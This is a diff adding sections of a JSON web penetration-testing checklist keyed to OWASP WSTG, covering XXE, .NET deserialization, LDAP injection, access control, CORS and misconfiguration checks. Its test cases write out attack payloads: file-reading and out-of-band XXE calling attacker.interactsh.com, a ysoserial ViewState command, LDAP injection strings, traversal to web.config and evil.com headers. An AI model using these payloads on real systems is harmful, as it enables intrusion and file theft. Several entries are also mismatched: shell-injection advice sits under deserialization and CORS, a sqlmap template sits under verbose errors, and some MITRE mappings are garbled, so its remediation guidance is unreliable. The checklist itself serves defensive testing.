+            "Find XML inputs: SOAP endpoints, XML file uploads, Content-Type: text/xml APIs",
+            "Basic XXE Windows: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+            "Basic XXE Linux: file:///etc/passwd",
+            "OOB XXE: <!ENTITY xxe SYSTEM \"http://attacker.interactsh.com/xxe\">",
+            "XXE via SVG upload: <?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+            "XXE in DOCX: inject into XML inside DOCX structure",
+            "PHP XXE: php://filter/convert.base64-encode/resource=/etc/passwd",
+            "Blind XXE via error: <!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;"
+          ],
+          "expected": "XML external entity processing disabled. DOCTYPE processing disabled. XXE not possible.",
+          "recommendation": "Disable XML External Entity (XXE) resolution and DTD processing in all XML parsers (e.g. setFeature disallow-doctype-decl to true).",
+          "tools": [
+            "Burp Suite",
+            "OWASP ZAP Active Scan",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-11",
+          "name": ".NET Deserialization / Code Injection",
+          "sev": "critical",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1059 - Standard Technique"
+          ],
+          "mitre": [
+            "T1059"
+          ],
+          "cwe": [
+            "CWE-502"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test .NET deserialization endpoints for RCE via crafted serialized object payloads.",
+          "cases": [
+            "Check cookies/headers for Base64-encoded blobs that may be serialized objects",
+            "Test JSON inputs with $type: {\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework...\"}",
+            "Json.NET TypeNameHandling: add \"$type\" to any JSON body parameter",
+            "ViewState deserialization (MAC disabled): ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"whoami\"",
+            "ysoserial.net gadget chains: ActivitySurrogateSelector, TypeConfuseDelegate, ObjectDataProvider",
+            "Test WCF endpoints, .NET Remoting (.rem, .soap URLs)",
+            "Check for BinaryFormatter, SoapFormatter, ObjectStateFormatter in error messages"
+          ],
+          "expected": "TypeNameHandling=None in Json.NET. BinaryFormatter not used. ViewState MAC enabled. No arbitrary type deserialization.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "ysoserial.net",
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-06",
+          "name": "LDAP Injection",
+          "sev": "high",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-90"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test authentication and search fields for LDAP injection \u2014 common in .NET apps using Active Directory authentication.",
+          "cases": [
+            "Login username field: *))(uid=*))(|(uid=*",
+            "Login: admin)(&)(",
+            "Login: )(|(password=*))",
+            "Search field: *(|(mail=*))",
+            "Test: does unexpected auth success occur?",
+            "Test: do error messages change format with injection chars?",
+            "Check .NET DirectorySearcher and PrincipalContext usage",
+            "Test both username AND password fields independently with LDAP chars"
+          ],
+          "expected": "LDAP queries use parameterized inputs or proper escaping. Injection characters treated as literals.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-17",
+          "name": "Host Header Injection",
+          "sev": "medium",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Privilege Escalation"
+          ],
+          "cwe": [
+            "CWE-20"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Modify the HTTP Host header and observe if it is reflected in responses, reset emails, or cache.",
+          "cases": [
+            "Password reset: intercept \u2192 change Host: evil.com \u2192 check if reset link contains evil.com",
+            "Test X-Forwarded-Host: evil.com \u2014 same effect, often trusted by apps",
+            "Test X-Host: evil.com | X-Forwarded-Server: evil.com",
+            "Cache poisoning: Host header value cached and served to other users?",
+            "Test absolute URL construction using Host header",
+            "Inject port: Host: evil.com:8080 \u2014 does port appear in responses?"
+          ],
+          "expected": "Host header not used to construct links or redirect URLs. Application uses statically configured base URL.",
+          "recommendation": "Implement standard HTTP security headers: Strict-Transport-Security (HSTS), X-Content-Type-Options: nosniff, Referrer-Policy, and a robust Content-Security-Policy.",
+          "tools": [
+            "Burp Repeater"
+          ],
+          "command_template": "curl -ik -I -X GET \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-20",
+          "name": "Mass Assignment",
+          "sev": "high",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Privilege Escalation"
+          ],
+          "cwe": [
+            "CWE-915"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test if extra parameters submitted to model binding endpoints set unauthorized fields.",
+          "cases": [
+            "POST /api/users: {\"name\":\"test\",\"isAdmin\":true,\"role\":\"admin\",\"privilegeLevel\":5}",
+            "Registration: add POST param isAdmin=true alongside normal fields",
+            "Update profile: add userId=[other_user_id] to hijack another account",
+            "Purchase: add creditBalance=99999 to request body",
+            "PATCH /api/users/me: {\"id\":999,\"verified\":true,\"role\":\"admin\"}",
+            ".NET MVC: test [Bind] attribute enforcement \u2014 add extra properties to model"
+          ],
+          "expected": "Only explicitly whitelisted properties bound. [Bind(Include=...)] or DTOs used. Extra fields silently ignored.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-15",
+          "name": "HTTP Request Smuggling",
+          "sev": "high",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Privilege Escalation"
+          ],
+          "cwe": [
+            "CWE-444"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test for HTTP request smuggling between frontend proxy and backend server using conflicting length headers.",
+          "cases": [
+            "CL.TE: send both Content-Length and Transfer-Encoding: chunked headers",
+            "TE.CL: Transfer-Encoding handled by frontend, Content-Length by backend",
+            "Send: POST / HTTP/1.1 with Transfer-Encoding: chunked AND Content-Length: X",
+            "Test TE header obfuscation: Transfer-Encoding: xchunked | Transfer-Encoding : chunked",
+            "H2.CL downgrade: HTTP/2 frontend to HTTP/1.1 backend smuggling",
+            "Burp HTTP Request Smuggler extension | Manual crafting with \r\n sequences",
+            "Test for request queue poisoning: other users get your smuggled request"
+          ],
+          "expected": "No HTTP request smuggling possible. Frontend and backend agree on request message boundaries.",
+          "recommendation": "Implement standard HTTP security headers: Strict-Transport-Security (HSTS), X-Content-Type-Options: nosniff, Referrer-Policy, and a robust Content-Security-Policy.",
+          "tools": [
+            "Burp HTTP Request Smuggler",
+            "Manual"
+          ],
+          "command_template": "curl -ik -I -X GET \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P5",
+      "name": "Access Control",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "WSTG-ATHZ-04",
+          "name": "IDOR \u2014 Insecure Direct Object References",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-639"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test all endpoints with resource IDs by substituting IDs of other users to access unauthorized resources.",
+          "cases": [
+            "GET /api/users/101/profile \u2192 change to /api/users/102/profile",
+            "GET /invoices/download?id=500 \u2192 try 499, 501, 1, 100",
+            "POST /api/messages?to=101 \u2192 change to to=102",
+            "Test ALL ID formats: sequential int, GUID, UUID, Base64, hashed IDs",
+            "Burp Intruder: iterate ID range \u2192 compare response body sizes",
+            "Two test accounts: User A tries to access User B resources via ID substitution",
+            "Test indirect refs: document names, emails, usernames as identifiers",
+            "Predictable GUIDs: some use timestamp-based GUIDs (UUIDv1) \u2014 test sequential"
+          ],
+          "expected": "All resource access enforced server-side by session identity. ID substitution returns 403. IDOR not possible.",
+          "recommendation": "Implement server-side authorization checks verifying that the authenticated user possesses explicit permission to access the requested resource ID.",
+          "tools": [
+            "Burp Intruder",
+            "Autorize (Burp extension)",
+            "Manual \u2014 2 accounts"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHZ-03",
+          "name": "Vertical Privilege Escalation",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1548 - Standard Technique"
+          ],
+          "mitre": [
+            "T1548"
+          ],
+          "cwe": [
+            "CWE-269"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test if a low-privilege user can access admin functionality by navigating to admin URLs or calling admin API endpoints.",
+          "cases": [
+            "Browse to /admin, /administrator, /manage, /cms while logged as low-priv user \u2014 403?",
+            "Call admin API: POST /api/admin/users | GET /api/admin/reports | DELETE /api/admin/users/1",
+            "JWT: decode \u2192 change role:user \u2192 role:admin \u2192 re-sign \u2192 resubmit",
+            "Swap session cookies: admin cookie \u2192 regular user \u2192 can they access admin page?",
+            "Test every admin function: create user, delete user, change roles, view audit logs",
+            "Test API: does admin-only endpoint accept low-privilege JWT token?",
+            "Role parameter manipulation: ?role=admin, &userType=admin added to requests"
+          ],
+          "expected": "Admin functions return 403 for non-admin users regardless of URL access method. RBAC enforced server-side only.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Autorize extension",
+            "Manual",
+            "jwt.io"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHZ-02",
+          "name": "Authorization Schema Bypass",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-863"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test various bypass techniques: method switching, path manipulation, special headers.",
+          "cases": [
+            "HTTP method switch: POST\u2192GET on admin endpoint \u2014 does GET bypass auth check?",
+            "Path case: /ADMIN vs /admin \u2014 case-sensitive routing?",
+            "Path encoding: /admin%2f | /admin%09 | /admin/../admin",
+            "Add: X-Original-URL: /admin header",
+            "Add: X-Rewrite-URL: /admin header",
+            "Test old API versions: /api/v1/ if /api/v2/ is protected",
+            "Path traversal in routing: /public/../admin",
+            "Content-Length: 0 bypass: some frameworks skip body parsing for empty bodies"
+          ],
+          "expected": "Authorization enforced regardless of HTTP method, URL encoding, or special headers.",
+          "recommendation": "Implement standard HTTP security headers: Strict-Transport-Security (HSTS), X-Content-Type-Options: nosniff, Referrer-Policy, and a robust Content-Security-Policy.",
+          "tools": [
+            "Burp Repeater",
+            "Manual"
+          ],
+          "command_template": "curl -ik -I -X GET \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHZ-01",
+          "name": "Path Traversal / Directory Traversal",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-22"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test file path parameters for directory traversal to read files outside the intended directory.",
+          "cases": [
+            "../../windows/win.ini in filename/path parameters",
+            "../../../etc/passwd",
+            "URL encoded: ..%2F..%2F..%2Fetc%2Fpasswd",
+            "Double encoded: %252e%252e%252f",
+            "Windows backslash: ..\\..\\windows\\win.ini",
+            "Null byte: ../../../etc/passwd%00.jpg",
+            "Mixed encoding: ....//....//etc/passwd",
+            ".NET: ..\\..\\web.config | ..%5C..%5Cweb.config",
+            "Absolute paths: /etc/passwd | C:\\windows\\win.ini",
+            "In download URLs: ?file=../../web.config | ?path=../appsettings.json"
+          ],
+          "expected": "File access restricted to intended directory. Traversal sequences blocked or stripped. Returns 400/403, not file contents.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "dotdotpwn",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHZ-05",
+          "name": "OAuth 2.0 Weaknesses",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-601",
+            "CWE-352"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test OAuth authorization flows for state validation, redirect_uri bypass, and token security.",
+          "cases": [
+            "State param: remove state from auth request \u2192 CSRF on OAuth flow possible?",
+            "State reuse: use a previously seen state value \u2192 accepted?",
+            "redirect_uri manipulation: ?redirect_uri=https://evil.com",
+            "redirect_uri prefix match: /callback/../../evil",
+            "redirect_uri: open redirect: https://legit.com.evil.com/callback",
+            "Authorization code replay: use auth code twice \u2192 second use must fail",
+            "Scope escalation: add scope=admin to auth request \u2192 granted?",
+            "PKCE bypass: remove code_challenge param \u2192 PKCE still enforced?",
+            "Implicit flow: access_token in URL fragment \u2192 Referer header leaks it?"
+          ],
+          "expected": "State param validated and bound to session. redirect_uri strictly validated. Auth codes single-use. PKCE enforced.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CLNT-09",
+          "name": "Clickjacking",
+          "sev": "medium",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-1021"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test if the application can be embedded in an iframe on an attacker-controlled page.",
+          "cases": [
+            "Check response headers: X-Frame-Options: DENY or SAMEORIGIN present?",
+            "Check CSP: frame-ancestors directive set?",
+            "Test page: <iframe src=\"https://target.com/login\" width=\"800\" height=\"600\"></iframe> \u2014 renders?",
+            "Test all sensitive pages: login, settings, transfer, admin functions",
+            "framebusting JS present? (fragile \u2014 CSP preferred)",
+            "Test SAMEORIGIN: does it apply consistently across all pages?"
+          ],
+          "expected": "X-Frame-Options: DENY or SAMEORIGIN on all pages. CSP frame-ancestors set. Application cannot be framed by external sites.",
+          "recommendation": "Set the Content-Security-Policy header with frame-ancestors 'self' and configure X-Frame-Options: DENY or SAMEORIGIN.",
+          "tools": [
+            "python3 scanner_cli.py",
+            "curl",
+            "Browser"
+          ],
+          "command_template": "python3 scanner_cli.py clickjacking \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CLNT-07",
+          "name": "CORS Misconfiguration",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-942"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test Cross-Origin Resource Sharing policy for overly permissive origins.",
+          "cases": [
+            "Add Origin: https://evil.com header \u2192 check Access-Control-Allow-Origin response",
+            "If response: Access-Control-Allow-Origin: https://evil.com = CORS vulnerability",
+            "Test null origin: Origin: null \u2192 Access-Control-Allow-Origin: null = vulnerable",
+            "Wildcard: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true = critical",
+            "Regex bypass: Origin: https://target.com.evil.com \u2192 accepted?",
+            "Subdomain bypass: Origin: https://evil.target.com \u2192 accepted (subdomain trust)?",
+            "Pre-flight OPTIONS: check permissive methods and headers allowed"
+          ],
+          "expected": "CORS allows only explicitly trusted origins. No wildcard with credentials. Null origin rejected.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Burp Repeater",
+            "Manual"
+          ],
+          "command_template": "curl -ik -I -X GET \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P6",
+      "name": "Security Misconfigurations",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "WSTG-CONF-07",
+          "name": "HTTP Security Headers Audit",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-16"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Check all HTTP response headers for security headers presence and correct configuration.",
+          "cases": [
+            "Strict-Transport-Security: max-age>=31536000; includeSubDomains; preload",
+            "Content-Security-Policy: defined, no unsafe-inline, no unsafe-eval, no wildcard script-src",
+            "X-Frame-Options: DENY or SAMEORIGIN (or CSP frame-ancestors)",
+            "X-Content-Type-Options: nosniff \u2014 prevent MIME sniffing",
+            "Referrer-Policy: strict-origin-when-cross-origin or no-referrer",
+            "Permissions-Policy: restrict camera, microphone, geolocation",
+            "Server header: should NOT contain version (Microsoft-IIS not Microsoft-IIS/10.0)",
+            "X-Powered-By: should NOT be present in any response",
+            "X-AspNet-Version: should NOT be present",
+            "Validate at: https://securityheaders.com \u2014 target grade A"
+          ],
+          "expected": "All security headers present. No version-disclosing headers. securityheaders.com grade A.",
+          "recommendation": "Implement standard HTTP security headers: Strict-Transport-Security (HSTS), X-Content-Type-Options: nosniff, Referrer-Policy, and a robust Content-Security-Policy.",
+          "tools": [
+            "python3 scanner_cli.py",
+            "securityheaders.com",
+            "curl -I",
+            "OWASP ZAP"
+          ],
+          "command_template": "python3 scanner_cli.py headers \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CRYP-01",
+          "name": "TLS / SSL Configuration",
+          "sev": "high",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-326"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test TLS configuration for weak protocols, weak ciphers, certificate validity, and known vulnerabilities.",
+          "cases": [
+            "testssl.sh target.com \u2014 comprehensive TLS audit",
+            "Check protocols: TLS 1.0, TLS 1.1, SSLv3 must be DISABLED",
+            "Cipher suites: RC4, DES, 3DES, EXPORT, ANON, NULL ciphers must be ABSENT",
+            "Certificate: expiry date check | CN/SAN domain match | chain completeness",
+            "Check: POODLE, BEAST, SWEET32, DROWN, HEARTBLEED, ROBOT vulnerability checks",
+            "nmap --script ssl-enum-ciphers -p 443 target.com",
+            "ssllabs.com/ssltest/ \u2014 target A+ rating",
+            "HSTS preload list status: check at hstspreload.org"
+          ],
+          "expected": "TLS 1.2 and 1.3 only. Strong cipher suites. Valid non-expired certificate. SSLLabs grade A+.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "testssl.sh",
+            "nmap ssl scripts",
+            "ssllabs.com/ssltest/"
+          ],
+          "command_template": "testssl.sh --quiet --color 0 \"{{HOST}}:{{PORT}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ERRH-01",
+          "name": "Verbose Error Messages",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-209"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Trigger application errors to check for stack traces, SQL errors, file paths, or internal details.",
+          "cases": [
+            "Add ' to inputs \u2192 SQL error messages? (Incorrect syntax near...)",
+            "404 page: check response body for framework details",
+            "Malformed JSON: send invalid JSON \u2192 inspect error response body",
+            "Wrong Content-Type: send XML to JSON endpoint \u2192 check error",
+            "Access /elmah.axd \u2014 must be 403 or 404 (error log)",
+            "Access /trace.axd \u2014 must be 403 or 404 (trace viewer)",
+            "Trigger NullReferenceException: send null values in required fields",
+            ".NET Yellow Screen of Death: trigger unhandled exception \u2192 stack trace?",
+            "Unicode/null bytes in inputs \u2192 exception disclosure?"
+          ],
+          "expected": "Generic user-friendly error messages only. No stack traces, SQL errors, file paths exposed. elmah.axd and trace.axd blocked.",
+          "recommendation": "Use parameterized queries (PreparedStatements / ORMs) for all database access. Never concatenate user input directly into SQL strings. Enforce database user least privilege.",
+          "tools": [
+            "Burp Repeater",
+            "Browser"
+          ],
+          "command_template": "sqlmap -u \"{{URL}}\" --batch --random-agent --banner",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CONF-06",
+          "name": "HTTP Methods Testing",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-16"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test for dangerous or unnecessary HTTP methods enabled on the server.",
+          "cases": [
+            "OPTIONS / HTTP/1.1 \u2014 lists allowed methods",
+            "TRACE / HTTP/1.1 \u2014 Cross-Site Tracing (XST) risk if enabled",
+            "PUT /test-upload.html with content \u2014 arbitrary file upload?",
+            "DELETE /index.html \u2014 deletion possible?",
+            "CONNECT method \u2014 proxy abuse potential",
+            "Test on ALL discovered paths, not just /",
+            "nmap --script http-methods -p 443 target.com"
+          ],
+          "expected": "Only GET, POST, HEAD enabled on web pages. TRACE disabled (405). PUT/DELETE restricted to authenticated API only.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "curl -X TRACE https://target.com/",
+            "nmap http-methods"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "CONF-NET-01",
+          "name": ".NET Specific Misconfigurations",
+          "sev": "high",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-16"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test .NET/IIS-specific configuration issues: diagnostic endpoints, debug mode, config file access.",
+          "cases": [
+            "Access /elmah.axd \u2192 must be 403/404",
+            "Access /trace.axd \u2192 must be 403/404",
+            "Access /WebResource.axd \u2192 check assembly info leakage",
+            "Swagger in production: /swagger | /swagger/index.html | /api-docs \u2014 must be 403/404",
+            "Direct config access: /web.config | /appsettings.json | /appsettings.Development.json \u2014 must be 403",
+            "Source control: /.git/config | /.git/HEAD \u2014 must be 403/404",
+            "Debug artifacts: X-AspNet-Version header present? X-Powered-By present?",
+            "Test /App_Data/, /App_Code/ directory listing",
+            "Test /__browserLink/ (Visual Studio browser link residual)"
+          ],
+          "expected": "All diagnostic endpoints blocked. Config files not web-accessible. Debug headers suppressed. Swagger absent in production.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Browser",
+            "Burp Repeater",
+            "gobuster"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CONF-12",
+          "name": "Content Security Policy Analysis",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-358"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Analyze the CSP header for weaknesses that allow XSS bypass.",
+          "cases": [
+            "Check for unsafe-inline in script-src \u2192 XSS protection bypassed",
+            "Check for unsafe-eval in script-src \u2192 eval() XSS possible",
+            "Wildcard source: script-src * or script-src https: \u2192 any HTTPS source allowed",
+            "data: URI in script-src \u2192 <script src=data:...> XSS",
+            "Missing object-src: * allows Flash/plugin-based XSS",
+            "Missing base-uri: allows <base href=https://evil.com> tag injection",
+            "Check whitelisted CDNs: jsonp callback endpoints or Angular libraries on CDN?",
+            "Report-Only CSP? \u2192 No protection, only reports",
+            "Evaluate at: https://csp-evaluator.withgoogle.com/"
+          ],
+          "expected": "No unsafe-inline/eval. Nonce or hash-based CSP. No wildcard script-src. object-src: none. base-uri restricted.",
+          "recommendation": "Apply contextual output encoding (HTML, JavaScript, Attribute context) before rendering untrusted input. Enforce a strong Content-Security-Policy (CSP) with nonce or hash-based script execution.",
+          "tools": [
+            "csp-evaluator.withgoogle.com",
+            "Burp",
+            "Browser DevTools Console"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"User-Agent: Pentest/1.0\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CONF-11",
+          "name": "Cloud Storage Misconfiguration",
+          "sev": "high",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-284"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test for exposed cloud storage buckets (S3, Azure Blob, GCS) with sensitive data.",
+          "cases": [
+            "Enumerate bucket names: company-name, company-prod, company-backup, company-dev, company-assets",
+            "AWS S3: curl https://company-name.s3.amazonaws.com/ \u2014 list bucket?",
+            "AWS S3 unauth: aws s3 ls s3://bucket-name --no-sign-request",
+            "Azure Blob: https://account.blob.core.windows.net/container/?restype=container&comp=list",
+            "GCS: https://storage.googleapis.com/bucket-name/",
+            "Find bucket names in HTML source, JS files, API responses",
+            "grayhatwarfare.com \u2014 search public bucket contents",
+            "s3scanner: s3scanner scan --bucket company-name"
+          ],
+          "expected": "No public buckets with sensitive data. All cloud storage requires authentication.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "aws cli",
+            "az cli",
+            "gcloud",
+            "s3scanner",
+            "grayhatwarfare.com"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CONF-04",
+          "name": "Backup & Unreferenced Files",
+          "sev": "high",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1552 - Standard Technique"
+          ],
+          "mitre": [
+            "T1552"
+          ],
+          "cwe": [
+            "CWE-538"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Search for backup files, temporary files, and unreferenced resources in the web root.",
+          "cases": [
+            "web.config.bak | web.config.old | web.config~ | web.config.orig",
+            "appsettings.json.bak | appsettings.json.old | appsettings.Production.json",
+            "index.aspx.bak | default.aspx.bak | index.aspx~",
+            ".env | .env.backup | .env.production | .env.local",
+            "database.sql | db.sql | db_backup.sql | dump.sql | backup.zip",
+            ".git/config | .git/HEAD (source code repo exposed)",
+            "composer.lock | package-lock.json (exact dependency versions)",
+            "gobuster with SecLists common backup extensions wordlist"
+          ],
+          "expected": "No backup or temporary files accessible. Config files and source code not in web root.",
